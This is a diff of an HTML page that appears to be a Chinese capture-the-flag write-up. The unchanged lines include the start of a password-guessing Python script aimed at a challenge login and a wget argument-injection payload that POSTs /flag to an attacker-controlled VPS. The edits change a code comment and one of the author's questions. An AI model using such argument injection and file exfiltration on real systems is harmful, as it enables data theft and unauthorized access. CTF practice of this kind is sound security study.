@@ -736,7 +736,7 @@ username<span class="token operator">=</span>admin <span class="token operator">
 <span class="token keyword">import</span> requests
 url <span class="token operator">=</span> <span class="token string">'http://aeaaf57a-67ce-4209-927a-0d19bf0b790c.node4.buuoj.cn:81/login'</span>
 headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span>  <span class="token operator">//</span>这里有坑，之前写了个text<span class="token operator">/</span>utf<span class="token operator">-</span><span class="token number">8</span>
+    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span>  
 <span class="token punctuation">&#125;</span>
 strings <span class="token operator">=</span> <span class="token string">"1234567890abcdefghijklmnopqrstuvwxyz"</span>
 passwd <span class="token operator">=</span> <span class="token string">""</span>
@@ -772,7 +772,7 @@ passwd <span class="token operator">=</span> <span class="token string">""</span
 <p>wget利用方法就和方式一差不多了，这里补充一个参数：<code>--body-file</code>同样可以发送文件，但是要<strong>指定方法</strong>。因此最后的payload就是：</p>
 <p><code>&quot;url&quot;:&quot;/wget?argv=111&amp;argv=--method=POST&amp;argv=--body-file=/flag&amp;argv=VPS:端口&quot;</code></p>
 <h3 id="疑惑："><a href="#疑惑：" class="headerlink" title="疑惑："></a>疑惑：</h3><p>1、闭合时候return后面为什么是}})，go是编译型语言的话，最外层应该影响不到了吧？但这里没最后)就是不行，而且既然最后那个括号都有了，为什么少了一个}</p>
-<p>2、Content-Type问题，为什么不是url编码不行</p>
+<p>2、os.Getenv(“ADMIN_PASS”)这个取得什么，大致找了找没找到</p>
 <p>3、ffff是干啥的</p>
 
                 
